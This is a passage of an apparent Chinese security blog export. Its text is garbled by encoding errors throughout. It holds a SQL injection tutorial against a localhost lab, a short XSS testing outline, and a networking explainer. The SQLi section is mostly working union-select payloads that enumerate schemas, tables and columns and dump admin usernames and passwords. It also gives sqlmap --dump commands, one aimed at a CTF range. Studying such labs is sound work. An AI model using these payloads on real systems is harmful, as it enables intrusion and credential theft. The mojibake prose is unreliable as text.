è”åˆæŸ¥è¯¢ï¼šå¯ä»¥ç”¨äºä¸€ä¸ªæˆ–å¤šä¸ªSELECTçš„ç»“æœé›†ï¼Œä½†æ˜¯ä»–æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œå°±æ˜¯ä¸¤ä¸ªselectæŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢å¿…é¡»è¦æœ‰ç›¸åŒçš„åˆ—æ‰å¯ä»¥æ‰§è¡Œï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬å¯ä»¥è¿›è¡Œå¯¹æ¯”æŸ¥è¯¢ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬union selectçš„åˆ—ä¸å®ƒæŸ¥è¯¢çš„åˆ—ç›¸åŒæ—¶ï¼Œé¡µé¢è¿”å›æ­£å¸¸ã€‚åœ¨andåé¢åŠ ä¸Š1=1æˆ–1=2çš„ä½œç”¨åé¢ä¼šè®²ã€‚ ä¾‹ï¼š å½“å­—æ®µä¸º2æ—¶é¡µé¢è¿”å›é”™è¯¯ http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2 //é”™è¯¯ http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3 //æ­£å¸¸æŸ¥è¯¢ http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3,4 //é”™è¯¯ ----- è¯´æ˜å­—æ®µæ•°å°±æ˜¯3ï¼Œè¾“å…¥çš„æ•°å¤§äºæˆ–å°äºå­—æ®µæ•°æ—¶éƒ½ä¼šæŠ¥é”™ã€‚ä½¿ç”¨ union select null,null,null æ˜¯ä¸€æ ·çš„ http://localhost/sqls/index.php?id=2 and 1 = 1 union select null,null,null 2.ç”¨order by æŸ¥è¯¢â€œorder by * â€” order by order byæŸ¥è¯¢ï¼šåœ¨sqlè¯­å¥ä¸­æ˜¯å¯¹ç»“æœé›†çš„æŒ‡å®šåˆ—è¿›è¡Œæ’åºï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³è®©ç»“æœé›†æŒ‰ç…§ç¬¬ä¸€åˆ—æ’åºå°±æ˜¯ order by 1 æŒ‰ç…§ç¬¬äºŒåˆ—æ’åº order by 2 ä¾æ¬¡ç±»æ¨ï¼ŒæŒ‰ç…§è¿™ä¸ªåŸç†æˆ‘ä»¬æ¥åˆ¤æ–­ä»–çš„å­—æ®µæ•°ï¼Œå¦‚æœæˆ‘ä»¬æŒ‰ç…§ä»–çš„ç¬¬1åˆ—è¿›è¡Œæ’åºæ•°æ®åº“ä¼šè¿”å›æ­£å¸¸ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŒ‰ç…§ç¬¬100åˆ—æ’åºï¼Œä½†æ˜¯æ•°æ®åº“ä¸­å¹¶ä¸å­˜åœ¨ç¬¬100åˆ—ï¼Œä»è€ŒæŠ¥é”™ã€‚ åŒunion è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ ç¬¬ä¸€ä¸ªï¼šå¤§éƒ¨åˆ†ç¨‹åºåªä¼šè°ƒç”¨æ•°æ®åº“æŸ¥è¯¢çš„ç¬¬ä¸€æ¡è¯­å¥è¿›è¡ŒæŸ¥è¯¢ç„¶åè¿”å›ï¼ˆæˆ‘ä»¬è¿™ä¸ªä¹Ÿæ˜¯ï¼‰ï¼Œè€Œé€šè¿‡è”åˆæŸ¥è¯¢å‡ºçš„æ•°æ®ä¸­ï¼Œæˆ‘ä»¬æƒ³çœ‹åˆ°çš„æ•°æ®æ˜¯åœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³çœ‹åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°æ®æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯è®©ç¬¬ä¸€æ¡æ•°æ®è¿”å›å‡ï¼Œç¬¬äºŒç§æ˜¯é€šè¿‡sqlè¯­å¥ç›´æ¥è¿”å›æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚ç¬¬ä¸€ç§ï¼šæˆ‘ä»¬è®©ç¬¬ä¸€ä¸ªæŸ¥è¯¢çš„ç»“æœå§‹ç»ˆä¸ºå‡ http://localhost/sqls/index.php?id=2 and 1=2 union select null,null,null ç¬¬äºŒç§ï¼šé€šè¿‡limitè¯­å¥ï¼Œlimitåœ¨mysqlä¸­æ˜¯ç”¨æ¥åˆ†é¡µçš„ï¼Œé€šè¿‡ä»–å¯ä»¥ä»æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä¸­è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ® limitè¯­æ³•: LIMIT [offset] rows | rows OFFSET offset LIMIT å­å¥å¯ä»¥è¢«ç”¨äºå¼ºåˆ¶ SELECT è¯­å¥è¿”å›æŒ‡å®šçš„è®°å½•æ•°ã€‚LIMIT æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªæ•°å­—å‚æ•°ã€‚å‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæ•´æ•°å¸¸é‡ã€‚å¦‚æœç»™å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šç¬¬ä¸€ä¸ªè¿”å›è®°å½•è¡Œçš„åç§»é‡ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿”å›è®°å½•è¡Œçš„æœ€å¤§æ•°ç›®ï¼Œåˆå§‹è®°å½•è¡Œçš„åç§»é‡æ˜¯ 0(è€Œä¸æ˜¯ 1)ã€‚ åˆ—: SELECT * FROM table LIMIT 5,10; // æ£€ç´¢è®°å½•è¡Œ 6-15 åœ¨åœ°å€åé¢åŠ å…¥ä»¥ä¸‹ä»£ç  http://localhost/sqls/index.php?id=2 union select null,null,null limit 1,1 ç¬¬äºŒä¸ªï¼šå“ªä¸ªåˆ—ä¸­çš„æ•°æ®æ˜¯åœ¨é¡µé¢ä¸­æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›åˆ—ä¸­çš„æ•°æ®åªæ˜¯ç”¨äºåå°ç¨‹åºå¤„ç†ï¼Œå¹¶ä¸ä¼šåœ¨å‰å°æ˜¾ç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­å“ªä¸ªå­—æ®µæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦é€šè¿‡æ•°å­—ä»£æ›¿NULLè¿›è¡ŒæŸ¥è¯¢ï¼Œæ¥ç¡®å®šå“ªäº›å­—æ®µä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤ºã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸ä¸€å¼€å§‹å°±ç”¨æ•°å­—è€Œç”¨nullï¼Œå› ä¸ºunion select ä¸ä»…è¦æ±‚åˆ—çš„æ•°é‡ç›¸åŒ åŒæ—¶æ•°æ®ç±»å‹ä¹Ÿè¦ç›¸ä¼¼ã€‚ æŸ¥è¯¢åº“å ç‰ˆæœ¬å¤§äº5.0çš„mysqlçš„information_schemaåº“ä¸­å­˜å‚¨ç€mysqlçš„æ‰€æœ‰æ•°æ®åº“å’Œè¡¨ç»“æ„ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨information_schemaåº“å¿«é€Ÿæ³¨å…¥ã€‚ é€šè¿‡ä¸‹é¢çš„è¯­å¥å¯ä»¥åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬ and ord(mid(version(),1,1))&gt;51 è§£é‡Š1ï¼š ç¡®è®¤æ•°æ®åº“ç‰ˆæœ¬ï¼Œ 51æ˜¯ASCIIç 3 æ­£ç¡®åˆ™&gt;4.0 é”™è¯¯åˆ™&lt;4.0ï¼Œå½“ç‰ˆæœ¬å¤§äº3.0æ—¶æ‰èƒ½ä½¿ç”¨unionæ–¹æ³•ï¼›è§£é‡Š2ï¼šord()æ˜¯mysqlçš„å‡½æ•°ç”¨äºè·å–äºŒè¿›åˆ¶ç ï¼›è§£é‡Š3ï¼šmid()æ˜¯mysqlçš„å‡½æ•°ç”¨äºæˆªä½æ“ä½œï¼›è§£é‡Š4ï¼šversion()æ˜¯mysqlçš„å‡½æ•°ç”¨äºè·å–å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ï¼› http://localhost/sqls/index.php?id=2 and ord(mid(version(),1,1))&gt;51 æ–¹æ³•ä¸€: å¯ä»¥ç›´æ¥ä½¿ç”¨mysqlè‡ªå¸¦å‡½æ•°database()æŸ¥è¯¢å¾—åˆ°æ•°æ®åº“åï¼š http://localhost/sqls/index.php?id=2 union select 1,database(),3 limit 1,1 æ–¹æ³•äºŒ: ä½¿ç”¨ä»¥ä¸‹è¯­å¥è¯­å¥å¾—åˆ°æ‰€æœ‰çš„æ•°æ®åº“å http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata è¿˜å¯ä»¥è·å–ç¬¬ä¸€ä¸ªåº“åï¼š http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata limit 0,1 å¹¶æ²¡æœ‰æ˜¾ç¤ºæ•°æ®åº“åè€Œæ˜¾ç¤ºçš„æ˜¯ç¬¬ä¸€æ¡è¯­å¥æŸ¥è¯¢å‡ºæ¥çš„ç»“æœã€‚åœ¨unionå‰é¢åŠ ä¸Šand 1=2ï¼Œå°±èƒ½æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1 è·å–ç¬¬äºŒä¸ªåº“åï¼š http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,2 æŸ¥è¡¨å åœ¨MySQLä¸­ï¼Œè¡¨åå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹tablesè¡¨table_nameå­—æ®µä¸­ã€æŸ¥è¡¨åæˆ‘ä»¬ä¸»è¦ç”¨åˆ°çš„æ˜¯TABLESè¡¨ã€‚ æ–¹æ³•ä¸€: ç”¨group_concatå®ƒå¯ä»¥è¿”å›æŸ¥è¯¢çš„æ‰€æœ‰ç»“æœï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦é€šè¿‡å‘½ååˆ¤æ–­è¯¥æˆ‘ä»¬éœ€è¦çš„æ•æ„Ÿæ•°æ®ã€‚ group_concat()ä¼šè®¡ç®—å“ªäº›è¡Œå±äºåŒä¸€ç»„ï¼Œå°†å±äºåŒä¸€ç»„çš„åˆ—æ˜¾ç¤ºå‡ºæ¥ã€‚è¦è¿”å›å“ªäº›åˆ—ï¼Œç”±å‡½æ•°å‚æ•°(å°±æ˜¯å­—æ®µå)å†³å®šã€‚åˆ†ç»„å¿…é¡»æœ‰ä¸ªæ ‡å‡†ï¼Œå°±æ˜¯æ ¹æ®group byæŒ‡å®šçš„åˆ—è¿›è¡Œåˆ†ç»„ã€‚ http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;test&#39; æ–¹æ³•äºŒ: ä½¿ç”¨ä¸‹é¢çš„è¯­å¥ä¹Ÿæ˜¯å¯ä»¥æŸ¥å‡ºæ¥çš„ http://localhost/sqls/index.php?id=2 union select null,table_name,null from information_schema.tables where table_schema=&#39;test&#39; æŸ¥å­—æ®µ åœ¨MySQLä¸­ï¼Œå­—æ®µåå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹columnsè¡¨column_nameå­—æ®µä¸­,è¿™é‡Œä½¿ç”¨çš„æ˜¯columnsè¡¨ã€‚ æ–¹æ³•ä¸€: http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;sqltest&#39; ä¹Ÿå¯ä»¥æŸ¥çœ‹adminè¡¨ä¸­çš„å­—æ®µã€‚ æ–¹æ³•äºŒ: http://localhost/sqls/index.php?id=2 union select null,column_name,null from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;admin&#39; æŸ¥æ•°æ® æœ€ç»ˆæƒ³å¾—åˆ°çš„å°±æ˜¯å­—æ®µé‡Œçš„å†…å®¹äº†ã€å‰é¢çš„æ•°æ®åº“åã€è¡¨åéƒ½è·å¾—äº†ã€è·å–å€¼å°±å¾ˆç®€å•äº†ã€‚ æ–¹æ³•ä¸€: æŸ¥è¯¢sqltestè¡¨: http://localhost/sqls/index.php?id=2 union select 1,group_concat(id,title,content),3 from `sqltest` æŸ¥è¯¢adminè¡¨: http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(id,user,pwd),3 from admin æ–¹æ³•äºŒ: æŸ¥è¯¢sqltestè¡¨: http://localhost/sqls/index.php?id=2 union select null,title,content from sqltest æŸ¥è¯¢adminè¡¨: http://localhost/sqls/index.php?id=2 union select id,user,pwd from admin æ–¹æ³•ä¸‰: æŸ¥è¯¢adminè¡¨: http://localhost/sqls/index.php?id=2 and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin sqlmap å·¥å…·ï¼šsqlmap é¶åœºï¼šhttps://rimovni.exeye.run/hugkudure/well 1617673856077\" style=\"zoom:50%; sqlmapæ³¨å…¥å¸¸è§ç”¨æ³•ï¼š æ£€æŸ¥æ³¨å…¥ç‚¹ sqlmap -u â€œhttp://ooxx.com/a.php?id=1â€œ åˆ—æ•°æ®åº“ä¿¡æ¯ sqlmap -u â€œhttp://ooxx.com/a.php?id=1â€œ â€”dbs æŒ‡å®šæ•°æ®åº“ååˆ—å‡ºæ‰€æœ‰è¡¨ sqlmap -u â€œhttp://ooxx.com/a.php?id=1â€œ -D dbsname â€”tables æŒ‡å®šæ•°æ®åº“åè¡¨ååˆ—å‡ºæ‰€æœ‰å­—æ®µ sqlmap -u â€œhttp://ooxx.com/a.php?id=1â€œ -D dbsname -T tablename â€”columns å®šæ•°æ®åº“åè¡¨åå­—æ®µdumpå‡ºæŒ‡å®šå­—æ®µ sqlmap -u â€œhttp://ooxx.com/a.php?id=1â€œ -D dbsname -T tablename -C columnname â€”dump cookie æ³¨å…¥ â€”cookie=COOKIE åœ¨éœ€è¦ç™»å½•çš„åœ°æ–¹ï¼Œéœ€è¦ç™»å½•åçš„cookie æ‰§è¡ŒæŒ‡å®šçš„ SQL è¯­å¥ â€”sql-query=QUERY ä»£ç†æ³¨å…¥ â€”proxy=â€http://127.0.0.1:8087â€œ å‘½ä»¤python sqlmap.py -u &quot;https://rimovni.exeye.run/hugkudure/well&quot; --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump â€”form :è¡¨å• â€”batch :è·³è¿‡é€‰æ‹© å¼€å§‹æ³¨å…¥ï¼Œè·å¾—æ•°æ®åº“ 1617674097343","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"}]},{"title":"Front end security","slug":"å‰ç«¯å®‰å…¨","date":"2021-04-04T07:56:49.000Z","updated":"2021-04-11T17:11:28.754Z","comments":true,"path":"å‰ç«¯å®‰å…¨/","link":"","permalink":"https://blog.kayleh.top/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/","excerpt":"","text":"å‰ç«¯å®‰å…¨ xssè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯WEBç¨‹åºä¸­ä¸€ç§å¸¸è§çš„æ¼æ´ã€‚å…¶ä¸»è¦çš„æ”»å‡»æ‰‹æ®µæ˜¯åœ¨åœ¨åˆ©ç”¨ç½‘ç«™ä¸Šçš„å¯ç”±ç”¨æˆ·è¾“å…¥ä¿¡æ¯çš„åœ°æ–¹ï¼Œæ¶æ„æ³¨å…¥å«æœ‰æ”»å‡»æ€§çš„è„šæœ¬ï¼Œè¾¾åˆ°æ”»å‡»ç½‘ç«™æˆ–è€…çªƒå–ç”¨æˆ·cookiedç­‰éšç§ä¿¡æ¯çš„ç›®çš„ã€‚ XSSæ¼æ´æµ‹è®¾æµç¨‹ï¼šç¬¬ä¸€æ­¥ï¼šåœ¨ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æŸ¥è¯¢æ¥å£ï¼Œç•™è¨€æ¿ç­‰ï¼›ç¬¬äºŒæ­¥ï¼šè¾“å…¥ä¸€ç»„â€œç‰¹æ®Šå­—ç¬¦+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤ï¼ŒæŸ¥çœ‹è¿”å›çš„æºç ï¼Œæ˜¯å¦æœ‰åšå¯¹åº”çš„å¤„ç†ï¼›ç¬¬ä¸‰æ­¥ï¼šé€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„æˆæ‰§è¡Œjsçš„æ¡ä»¶ï¼ˆæ„é€ é—­åˆï¼‰ç¬¬å››æ­¥ï¼šæäº¤æ„é€ çš„è„šæœ¬ä»£ç ï¼ˆä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿ï¼‰ï¼Œçœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœæˆåŠŸæ‰§åˆ™è¯´æ˜å­˜åœ¨XSSæ¼æ´ Html5å­˜å‚¨","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"}]},{"title":"What happened from entering the URL to displaying the page?","slug":"ä»è¾“å…¥URLåˆ°æ˜¾ç¤ºé¡µé¢ç»å†äº†ä»€ä¹ˆ","date":"2021-03-30T09:22:51.000Z","updated":"2021-04-15T15:10:07.693Z","comments":true,"path":"ä»è¾“å…¥URLåˆ°æ˜¾ç¤ºé¡µé¢ç»å†äº†ä»€ä¹ˆ/","link":"","permalink":"https://blog.kayleh.top/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/","excerpt":"","text":"ä»è¾“å…¥URLåˆ°æ˜¾ç¤ºé¡µé¢ç»å†äº†ä»€ä¹ˆ? è¿™ä¸ªè¿‡ç¨‹å¯ä»¥å¤§è‡´åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šç½‘ç»œé€šä¿¡å’Œé¡µé¢æ¸²æŸ“ã€‚ ä¸€ã€ç½‘ç»œé€šä¿¡ äº’è”ç½‘å†…å„ç½‘ç»œè®¾å¤‡é—´çš„é€šä¿¡éƒ½éµå¾ªTCP/IPåè®®ï¼Œåˆ©ç”¨TCP/IPåè®®æ—è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶ï¼Œä¼šé€šè¿‡åˆ†å±‚é¡ºåºä¸å¯¹æ–¹è¿›è¡Œé€šä¿¡ã€‚åˆ†å±‚ç”±é«˜åˆ°ä½åˆ†åˆ«ä¸ºï¼šåº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‚å‘é€ç«¯ä»åº”ç”¨å±‚å¾€ä¸‹èµ°ï¼Œæ¥æ”¶ç«¯ä»æ•°æ®é“¾è·¯å±‚ç½‘ä¸Šèµ°ã€‚å¦‚å›¾æ‰€ç¤ºï¼š 1. åœ¨æµè§ˆå™¨ä¸­è¾“å…¥url ç”¨æˆ·è¾“å…¥urlï¼Œä¾‹å¦‚http://[www.baidu.com](http://www.baidu.com/)ã€‚å…¶ä¸­httpä¸ºåè®®ï¼Œ[www.baidu.com](http://www.baidu.com/)ä¸ºç½‘ç»œåœ°å€ï¼ŒåŠæŒ‡å‡ºéœ€è¦çš„èµ„æºåœ¨é‚£å°è®¡ç®—æœºä¸Šã€‚ä¸€èˆ¬ç½‘ç»œåœ°å€å¯ä»¥ä¸ºåŸŸåæˆ–IPåœ°å€ï¼Œæ­¤å¤„ä¸ºåŸŸåã€‚ä½¿ç”¨åŸŸåæ˜¯ä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œä½†æ˜¯ä¸ºäº†è®©è®¡ç®—æœºç†è§£è¿™ä¸ªåœ°å€è¿˜éœ€è¦æŠŠå®ƒè§£æä¸ºIPåœ°å€ã€‚ 2.åº”ç”¨å±‚DNSè§£æåŸŸå å®¢æˆ·ç«¯å…ˆæ£€æŸ¥æœ¬åœ°æ˜¯å¦æœ‰å¯¹åº”çš„IPåœ°å€ï¼Œè‹¥æ‰¾åˆ°åˆ™è¿”å›å“åº”çš„IPåœ°å€ã€‚è‹¥æ²¡æ‰¾åˆ°åˆ™è¯·æ±‚ä¸Šçº§DNSæœåŠ¡å™¨ï¼Œç›´è‡³æ‰¾åˆ°æˆ–åˆ°æ ¹èŠ‚ç‚¹ã€‚ DNSä¸­é€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢çš„åŒºåˆ« 1ã€ é€’å½’æŸ¥è¯¢ï¼š ä¸€èˆ¬å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¹‹é—´å±é€’å½’æŸ¥è¯¢ï¼Œå³å½“å®¢æˆ·æœºå‘DNSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚åï¼Œè‹¥DNSæœåŠ¡å™¨æœ¬èº«ä¸èƒ½è§£æï¼Œåˆ™ä¼šå‘å¦å¤–çš„DNSæœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢è¯·æ±‚ï¼Œå¾—åˆ°ç»“æœåè½¬äº¤å®¢æˆ·æœºã€‚ 2ã€ è¿­ä»£æŸ¥è¯¢ï¼ˆåå¤æŸ¥è¯¢ï¼‰ï¼š ä¸€èˆ¬DNSæœåŠ¡å™¨ä¹‹é—´å±è¿­ä»£æŸ¥è¯¢ï¼Œå¦‚ï¼šè‹¥DNS2ä¸èƒ½å“åº”DNS1çš„è¯·æ±‚ï¼Œåˆ™å®ƒä¼šå°†DNS3çš„IPç»™DNS2ï¼Œä»¥ä¾¿å…¶å†å‘DNS3å‘å‡ºè¯·æ±‚ã€‚ ä»¥ä¸€ä¸ªDNSè¯·æ±‚è§£æä¸ºä¾‹ï¼š 1ï¼‰ç”¨æˆ·å‘èµ·åŸŸåè¯·æ±‚åˆ°dnsAï¼Œè¿™æ—¶dnsAæœ‰è¿™ä¸ªè®°å½•ï¼Œå°†ç»“æœè¿”å›ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€’å½’æŸ¥è¯¢ã€‚ 2ï¼‰ç”¨æˆ·å‘èµ·åŸŸåè¯·æ±‚åˆ°dnsAï¼Œè¿™æ—¶dnsæ²¡æœ‰è¿™ä¸ªè®°å½•ï¼Œå®ƒå»å‘dnsBé—®æœ‰æ²¡æœ‰è¿™ä¸ªè®°å½•ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æŠŠç»“æœè¿”å›ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€’å½’æŸ¥è¯¢ã€‚ 3ï¼‰ç”¨æˆ·å‘èµ·åŸŸåè¯·æ±‚åˆ°dnsAï¼Œè¿™æ—¶dnsAæ²¡æœ‰è¿™ä¸ªè®°å½•ï¼Œå®ƒå‘Šè¯‰ç”¨æˆ·ï¼Œæˆ‘æ²¡æœ‰è¿™ä¸ªè®°å½•ï¼Œä½ å»é—®dnsBå§ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯è¿­ä»£æŸ¥è¯¢ã€‚ 3.åº”ç”¨å±‚å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚ HTTPè¯·æ±‚åŒ…æ‹¬è¯·æ±‚æŠ¥å¤´å’Œè¯·æ±‚ä¸»ä½“ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­è¯·æ±‚æŠ¥å¤´åŒ…å«äº†è‡³å…³é‡è¦çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚çš„æ–¹æ³•ï¼ˆGET / POSTï¼‰ã€ç›®æ ‡urlã€éµå¾ªçš„åè®®ï¼ˆhttp / https / ftpâ€¦ï¼‰ï¼Œè¿”å›çš„ä¿¡æ¯æ˜¯å¦éœ€è¦ç¼“å­˜ï¼Œä»¥åŠå®¢æˆ·ç«¯æ˜¯å¦å‘é€cookieç­‰ã€‚ 4.ä¼ è¾“å±‚TCPä¼ è¾“æŠ¥æ–‡ä½äºä¼ è¾“å±‚çš„TCPåè®®ä¸ºä¼ è¾“æŠ¥æ–‡æä¾›å¯é çš„å­—èŠ‚æµæœåŠ¡ã€‚å®ƒä¸ºäº†æ–¹ä¾¿ä¼ è¾“ï¼Œå°†å¤§å—çš„æ•°æ®åˆ†å‰²æˆä»¥æŠ¥æ–‡æ®µä¸ºå•ä½çš„æ•°æ®åŒ…è¿›è¡Œç®¡ç†ï¼Œå¹¶ä¸ºå®ƒä»¬ç¼–å·ï¼Œæ–¹ä¾¿æœåŠ¡å™¨æ¥æ”¶æ—¶èƒ½å‡†ç¡®åœ°è¿˜åŸæŠ¥æ–‡ä¿¡æ¯ã€‚TCPåè®®é€šè¿‡â€œä¸‰æ¬¡æ¡æ‰‹â€ç­‰æ–¹æ³•ä¿è¯ä¼ è¾“çš„å®‰å…¨å¯é ã€‚ â€œä¸‰æ¬¡æ¡æ‰‹â€çš„è¿‡ç¨‹æ˜¯ï¼Œå‘é€ç«¯å…ˆå‘é€ä¸€ä¸ªå¸¦æœ‰SYNï¼ˆsynchronizeï¼‰æ ‡å¿—çš„æ•°æ®åŒ…ç»™æ¥æ”¶ç«¯ï¼Œåœ¨ä¸€å®šçš„å»¶è¿Ÿæ—¶é—´å†…ç­‰å¾…æ¥æ”¶çš„å›å¤ã€‚æ¥æ”¶ç«¯æ”¶åˆ°æ•°æ®åŒ…åï¼Œä¼ å›ä¸€ä¸ªå¸¦æœ‰SYN/ACKæ ‡å¿—çš„æ•°æ®åŒ…ä»¥ç¤ºä¼ è¾¾ç¡®è®¤ä¿¡æ¯ã€‚æ¥æ”¶æ–¹æ”¶åˆ°åå†å‘é€ä¸€ä¸ªå¸¦æœ‰ACKæ ‡å¿—çš„æ•°æ®åŒ…ç»™æ¥æ”¶ç«¯ä»¥ç¤ºæ¡æ‰‹æˆåŠŸã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‘é€ç«¯åœ¨è§„å®šå»¶è¿Ÿæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°å›å¤åˆ™é»˜è®¤æ¥æ”¶æ–¹æ²¡æœ‰æ”¶åˆ°è¯·æ±‚ï¼Œè€Œå†æ¬¡å‘é€ï¼Œç›´åˆ°æ”¶åˆ°å›å¤ä¸ºæ­¢ã€‚ 5.ç½‘ç»œå±‚IPåè®®æŸ¥è¯¢MACåœ°å€IPåè®®çš„ä½œç”¨æ˜¯æŠŠTCPåˆ†å‰²å¥½çš„å„ç§æ•°æ®åŒ…ä¼ é€ç»™æ¥æ”¶æ–¹ã€‚è€Œè¦ä¿è¯ç¡®å®èƒ½ä¼ åˆ°æ¥æ”¶æ–¹è¿˜éœ€è¦æ¥æ”¶æ–¹çš„MACåœ°å€ï¼Œä¹Ÿå°±æ˜¯ç‰©ç†åœ°å€ã€‚IPåœ°å€å’ŒMACåœ°å€æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œä¸€ä¸ªç½‘ç»œè®¾å¤‡çš„IPåœ°å€å¯ä»¥æ›´æ¢ï¼Œä½†æ˜¯MACåœ°å€ä¸€èˆ¬æ˜¯å›ºå®šä¸å˜çš„ã€‚ARPåè®®å¯ä»¥å°†IPåœ°å€è§£ææˆå¯¹åº”çš„MACåœ°å€ã€‚å½“é€šä¿¡çš„åŒæ–¹ä¸åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘æ—¶ï¼Œéœ€è¦å¤šæ¬¡ä¸­è½¬æ‰èƒ½åˆ°è¾¾æœ€ç»ˆçš„ç›®æ ‡ï¼Œåœ¨ä¸­è½¬çš„è¿‡ç¨‹ä¸­éœ€è¦é€šè¿‡ä¸‹ä¸€ä¸ªä¸­è½¬ç«™çš„MACåœ°å€æ¥æœç´¢ä¸‹ä¸€ä¸ªä¸­è½¬ç›®æ ‡ã€‚ 6.æ•°æ®åˆ°è¾¾æ•°æ®é“¾è·¯å±‚åœ¨æ‰¾åˆ°å¯¹æ–¹çš„MACåœ°å€åï¼Œå°±å°†æ•°æ®å‘é€åˆ°æ•°æ®é“¾è·¯å±‚ä¼ è¾“ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„é˜¶æ®µç»“æŸ 7.æœåŠ¡å™¨æ¥æ”¶æ•°æ®æ¥æ”¶ç«¯çš„æœåŠ¡å™¨åœ¨é“¾è·¯å±‚æ¥æ”¶åˆ°æ•°æ®åŒ…ï¼Œå†å±‚å±‚å‘ä¸Šç›´åˆ°åº”ç”¨å±‚ã€‚è¿™è¿‡ç¨‹ä¸­åŒ…æ‹¬åœ¨è¿è¾“å±‚é€šè¿‡TCPåè®®è®²åˆ†æ®µçš„æ•°æ®åŒ…é‡æ–°ç»„æˆåŸæ¥çš„HTTPè¯·æ±‚æŠ¥æ–‡ã€‚ 